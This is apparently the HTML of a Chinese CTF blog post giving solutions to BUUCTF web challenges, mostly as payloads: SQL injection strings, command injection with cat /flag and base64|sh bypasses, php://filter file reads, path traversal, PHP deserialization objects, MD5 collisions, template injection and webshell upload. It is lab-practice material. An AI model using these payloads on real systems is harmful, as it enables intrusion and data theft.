<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´» | 0raN9e's Blog</title><meta name=keywords content="web"><meta name=description content="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
admin' or 1=1#
[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
f12çœ‹æºç 

                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
/?cat=dog
[HCTF 2018]WarmUp
çœ‹æºç 
    <!--source.php-->
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;];
            if (! isset($page) || !is_string($page)) {
                echo &#34;you can't see it&#34;;
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo &#34;you can't see it&#34;;
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo &#34;<br><img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; />&#34;;
    }  
?>
hint.php"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/ctf/buuctf-web/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/ctf/buuctf-web/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/ctf/buuctf-web/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»"><meta property="og:description" content="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL admin' or 1=1# [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun f12çœ‹æºç 
<!-- $cat=$_GET['cat']; echo $cat; if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}'; } --> /?cat=dog [HCTF 2018]WarmUp çœ‹æºç 
<!--source.php--> <?php highlight_file(__FILE__); class emmm { public static function checkFile(&$page) { $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;]; if (! isset($page) || !is_string($page)) { echo &#34;you can't see it&#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &#34;you can't see it&#34;; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &#34;<br><img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; />&#34;; } ?> hint.php"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-03-01T00:00:00+00:00"><meta property="article:tag" content="Web"><meta name=twitter:card content="summary"><meta name=twitter:title content="Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»"><meta name=twitter:description content="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
admin' or 1=1#
[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
f12çœ‹æºç 

                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
/?cat=dog
[HCTF 2018]WarmUp
çœ‹æºç 
    <!--source.php-->
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;];
            if (! isset($page) || !is_string($page)) {
                echo &#34;you can't see it&#34;;
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo &#34;you can't see it&#34;;
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo &#34;<br><img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; />&#34;;
    }  
?>
hint.php"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":2,"name":"æ–‡ç« ","item":"http://blog.0ran9e.cn/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»","item":"http://blog.0ran9e.cn/posts/ctf/buuctf-web/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»","name":"Re:ä»é›¶å¼€å§‹çš„BUUçš„webç”Ÿæ´»","description":"[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL admin\u0026#39; or 1=1# [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun f12çœ‹æºç \n\u0026lt;!-- $cat=$_GET[\u0026#39;cat\u0026#39;]; echo $cat; if($cat==\u0026#39;dog\u0026#39;){ echo \u0026#39;Syc{cat_cat_cat_cat}\u0026#39;; } --\u0026gt; /?cat=dog [HCTF 2018]WarmUp çœ‹æºç \n\u0026lt;!--source.php--\u0026gt; \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; hint.php\n","keywords":["web"],"articleBody":"[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL admin' or 1=1# [æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun f12çœ‹æºç \n/?cat=dog [HCTF 2018]WarmUp çœ‹æºç \n\u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\n\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e hint.php\nflag not here, and flag in ffffllllaaaagggg /source.php?file=source.php?/../../../../ffffllllaaaagggg [ACTF2020 æ–°ç”Ÿèµ›]Include /?file=php://filter/convert.base64-encode/resource=flag.php [ACTF2020 æ–°ç”Ÿèµ›]Exec 127.0.0.1;ls / 127.0.0.1;cat /flag [GXYCTF2019]Ping Ping Ping è¿™é‡Œä¸»è¦è€ƒå¯Ÿçš„æ˜¯åˆ†æé»‘ç›’è¿‡æ»¤äº†ä»€ä¹ˆä»è€Œæ­£å¸¸è¯»\n?ip=127.0.0.1|tac$IFS$9index.php /?ip=\r?\u003e\r}\rprint_r($a);\recho \"\r\";\r$a = shell_exec(\"ping -c 4 \".$ip);\r}\rdie(\"fxck your flag!\");\r} else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\rdie(\"fxck your bash!\");\r} else if(preg_match(\"/bash/\", $ip)){\rdie(\"fxck your space!\");\r} else if(preg_match(\"/ /\", $ip)){\rdie(\"fxck your symbol!\");\recho preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\rif(preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{1f}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\r$ip = $_GET['ip'];\rif(isset($_GET['ip'])){ è§£é¢˜1 ?ip=127.0.0.1;a=ag;b=fl;cat$IFS$1$b$a.php è§£é¢˜2 åˆ©ç”¨base64å’Œshè¿›è¡Œè¯»å–\n/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh è§£é¢˜3 å†…è”æ‰§è¡Œ\n/?ip=1;cat$IFS$1`ls` [SUCTF 2019]EasySQL å †å æ³¨å…¥(æˆ‘å·²ç»æœ‰äº›å¿˜äº†),å…ˆè¿›è¡ŒæŸ¥åº“\nquery=1;show databases; çœ‹çš„wpè¿™é‡Œæ˜¯\nselect $_POST['query'] || flag from flag è§£é¢˜1 *,1 åŸç†æ˜¯æ„æˆäº†è¯­å¥æ˜¯\nselect *,1 || flag from flag å®é™…ä¸Šæ˜¯æ‰§è¡Œ\nselect *,1 from flag è§£é¢˜2 PIPES_AS_CONCAT æ˜¯ MySQL çš„ä¸€ä¸ª SQL æ¨¡å¼é€‰é¡¹ã€‚å¯ç”¨åï¼Œ|| ä¼šè¢«è§£é‡Šä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œè€Œä¸æ˜¯é€»è¾‘ OR è¿ç®—ç¬¦ã€‚\nSET sql_mode = 'PIPES_AS_CONCAT'; æ‰€ä»¥\n1;set sql_mode=PIPES_AS_CONCAT;select 1 ç±»ä¼¼å°±æ˜¯\nselect set sql_mode=PIPES_AS_CONCAT;select 1,flag from flag [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL admin' or 1=1# 1 ç™»å…¥å¾—åˆ°\nYour password is '220b8cd38492347b73e6d47a623dcd9a' æ²¡å•¥ç”¨ç»§ç»­æŸ¥\n1' or 1=1 order by 3# æµ‹å‡ºä¸‰åˆ—\n1'union select 1,2,3# å›æ˜¾æ˜¯\nHello 2ï¼\rYour password is '3' 1'union select 1,databae(),3# 1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\"geek\"# 1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\"l0ve1ysq1\"# 1'union select 1,group_concat(password),3 from l0ve1ysq1# æœ€åæŸ¥çœ‹flag\n[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ å…ˆå°è¯•\n1\" or 1=1# è¾“å…¥select\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); å¤§æ¦‚æ˜¯å †å æ³¨å…¥å§\n1\" or show database()# 1\";show database()# 1';show tables# è¿™é‡Œæˆ‘æ›´å€¾å‘äºå…ˆfuzzä¸€ä¸‹\narray(1) { [0]=\u003e string(16) \"1919810931114514\" } array(1) { [0]=\u003e string(5) \"words\" } 1';show columns from `words`# 1';show columns from `1919810931114514`# é‡Œé¢æœ‰flagï¼Œæ¥ä¸‹æ¥æ˜¯ä¸‰ç§æ€è·¯\nè§£é¢˜1 æ¢è¡¨\n1';rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT '12';ALTER TABLE words CHANGE flag data VARCHAR(100);# 1';show tables# 1';show columns from `words`# 1' or 1=1# åˆ©ç”¨æœ¬æ¥å°±å­˜åœ¨çš„æŸ¥è¯¢æ–¹æ³•å¸®æˆ‘ä»¬è¿›è¡ŒæŸ¥è¯¢\nè§£é¢˜2 åˆ©ç”¨é¢„å¤„ç†çš„æ–¹æ³•è¿›è¡Œæ„é€ ï¼Œselect * from `1919810931114514`è¿›è¡Œ16è¿›åˆ¶ç¼–ç (ç¯å¢ƒå¥½åƒæœ‰é—®é¢˜æ²¡æ‰“é€šï¼ŒåŸç†æ˜¯è¿™æ ·çš„)\n1;SET@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# è§£é¢˜3 åˆ©ç”¨handleræ‰“å¼€æŸ¥è¯¢ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¸¸è§çš„æ‰‹æ³•\n1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;# [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File çœ‹æºç \n/Archive_room.php\nå†çœ‹\n/action.php\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003c/html\u003e secret\r\u003c?php\rhighlight_file(__FILE__);\rerror_reporting(0);\r$file=$_GET['file'];\rif(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\recho \"Oh no!\";\rexit();\r}\rinclude($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ\r?\u003e\r/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php [æå®¢å¤§æŒ‘æˆ˜ 2019]Http çœ‹æºç /Secret.php\nReferer\thttps://Sycsecret.buuoj.cn\rUser-Agent\tSyclover\rX-Forwarded-For\t127.0.0.1 [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload å†™å…¥å›¾ç‰‡é©¬ï¼ŒbpæŠ“åŒ…æ‹¦æˆªæ”¹phtmlï¼Œç„¶åèšå‰‘è¿ä¸Šå°±è¡Œ\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife Syc=system('cat /f*'); postå‘åŒ…\n[ACTF2020 æ–°ç”Ÿèµ›]Upload å‚è€ƒä¸Šé¢çš„æå®¢å¤§æŒ‘æˆ˜ï¼Œæˆ‘ç›´æ¥åšæ³•ä¸€è‡´\n[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL admin\" or 1=1# ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œbpæ¥fuzzä¸€ä¸‹å§\nä¸»è¦åˆ†ä¸ºä¸‰ç§ï¼Œerrorå’Œnopasswordå’Œinput\nåº”è¯¥æ˜¯è¿‡æ»¤äº†selectå’Œunion,è¿˜æœ‰ä¸€äº›è¿‡æ»¤è‡ªå·±æµ‹\n1â€™ununionion seselectlect 1,2,3# 1%27ununionion%20seselectlect%201,2,3%23 1%27ununionion%20seselectlect%201,database(),3%23 1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27geek%27%23 1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27b4bsql%27%23 å‘ç°æ²¡æ‰¾åˆ°ï¼Œç›´æ¥æ”¾æœ€åä¸€æ­¥å§ï¼Œæ…¢æ…¢æ‰¾\n1%27%20ununionion%20seselectlect%201,2,group_concat(flag)%20frfromom%20ctf.Flag%23 è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¼„æ¸…è¿‡æ»¤ä»€ä¹ˆå°±è¡Œ\n[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP è®¿é—®/www.zip\nçœ‹class.php\n\u003c?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-\u003eusername = $username; $this-\u003epassword = $password; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if ($this-\u003epassword != 100) { echo \"NO!!!hacker!!!\"; echo \"You name is: \"; echo $this-\u003eusername;echo \"\"; echo \"You password is: \"; echo $this-\u003epassword;echo \"\"; die(); } if ($this-\u003eusername === 'admin') { global $flag; echo $flag; }else{ echo \"hello my friend~~sorry i can't give you the flag!\"; die(); } } } ?\u003e \u003c?php\rclass Name{\rprivate $username = 'nonono';\rprivate $password = 'yesyes';\rpublic function __construct($username, $password){\r$this-\u003eusername = $username;\r$this-\u003epassword = $password;\r}\r}\r$obj = new Name('admin', 100);\recho serialize($obj);\r?\u003e#ä¿®æ”¹ç»•è¿‡O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} /index.php?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} [ACTF2020 æ–°ç”Ÿèµ›]BackupFile diræ‰¾åˆ°\n[15:27:32] 200 - 347B - /index.php.bak ä¸‹è½½å\n\u003c?php include_once \"flag.php\"; if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(\"Just num!\"); } $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) { echo $flag; } } else { echo \"Try to find out source file!\"; } ?key=123 [RoarCTF 2019]Easy Calc çœ‹ä¸€ä¸‹æºç \n$('#calc').submit(function(){ $.ajax({ url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()), type:'GET', success:function(data){ $(\"#result\").html(`\u003cdiv class=\"alert alert-success\"\u003e \u003cstrong\u003eç­”æ¡ˆ:\u003c/strong\u003e${data} \u003c/div\u003e`); }, error:function(){ alert(\"è¿™å•¥?ç®—ä¸æ¥!\"); } }) return false; }) çœ‹ä¸€ä¸‹æºç \n\u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); } ?\u003e /calc.php? num=1;var_dump(scandir(chr(47))); è¯»å–å½“å‰ç›®å½•çš„å†…å®¹æ‰¾åˆ°flag\n/calc.php? num=1;var_dump(include(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); è€ƒå¯Ÿçš„åå‡½æ•°ç»•è¿‡å§\n[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag money[]=100000000\u0026password=404abc cookie:user=1 [BJDCTF2020]Easy MD5 å‰ç«¯ä¸€èˆ¬ç›´æ¥æ‰¾ä¸åˆ°çš„è¯æŠ“åŒ…çœ‹çœ‹\nselect * from 'admin' where password=md5($pass,true) åˆ©ç”¨sqlç‰¹æ€§çš„md5çš„å­—ç¬¦ä¸²ffifdyop,è¿›å…¥ä¸‹ä¸€å±‚\n?a[]=1\u0026b[]=2 \u003c?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag; } param1=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026param2=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 [HCTF 2018]admin è§£é¢˜1 å¼±å¯†ç \nadmin :123 è§£é¢˜2 å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åchange passwordï¼Œçœ‹æºç å¯ä»¥æ‰¾åˆ°\nç°åœ¨å·²ç»æ²¡äº†ï¼Œæºç ä¸¢å¤±ä¸æ–¹ä¾¿å†™ï¼Œåº”è¯¥å°±æ˜¯æ­£å¸¸çš„cookieæ±¡æŸ“\nè§£é¢˜3 unicodeè¿›è¡Œè§£é¢˜\nunicodeä¼ªé€ adminè¿›è¡Œç™»å…¥æ”¹å¯†ç ç„¶åå†è¿›å…¥è¿›è¡Œä¼ªé€ \n[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ åˆ©ç”¨.htaccessä¼ªé€ å›¾ç‰‡é©¬ä¼ å…¥ï¼Œèšå‰‘è¿\n[æŠ¤ç½‘æ¯ 2018]easy_tornado hints.txtå†…å®¹\nmd5(cookie_secret+md5(filename)) md5(cookie_secret+md5(fllllllllllllag)) å¦‚é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥\n/error?msg={{handler.settings}} å¾—åˆ°\n{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '11e71ec2-6ea2-47d0-b195-23bca3c02b8f'} import hashlib inner_string = \"/fllllllllllllag\" cookie_secret = \"11e71ec2-6ea2-47d0-b195-23bca3c02b8f\" inner_md5 = hashlib.md5(inner_string.encode()).hexdigest() concatenated_string = cookie_secret + inner_md5 outer_md5 = hashlib.md5(concatenated_string.encode()).hexdigest() print(outer_md5) /file?filename=/fllllllllllllag\u0026filehash=bd9d4433dc3382c948d7dbc0a2a4ee79 è¿™é‡Œçš„ç–‘ç‚¹æ˜¯ä¸ºä»€ä¹ˆç”¨msgè¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œç½‘ä¸Šå¥½åƒæ²¡æœ‰è§£æã€‚\n[ZJCTF 2019]NiZhuanSiWei \u003c?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)\u0026\u0026(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"\n\".file_get_contents($text,'r').\"\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u003e ?text=data://text/plain,welcome to the zjctf\u0026file=php://filter/read=convert.base64-encode/resource=useless.php \u003c?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\n\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?\u003e \u003c?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\n\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } $exp=new Flag(); $exp-\u003efile='flag.php'; echo serialize($exp); ?text=data://text/plain,welcome to the zjctf\u0026file=useless.php\u0026password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}; [MRCTF2020]Ez_bypass I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first POST /?id=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026gg=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 HTTP/1.1 Host: db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81 Cache-Control: max-age=0 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Upgrade-Insecure-Requests: 1 Accept: 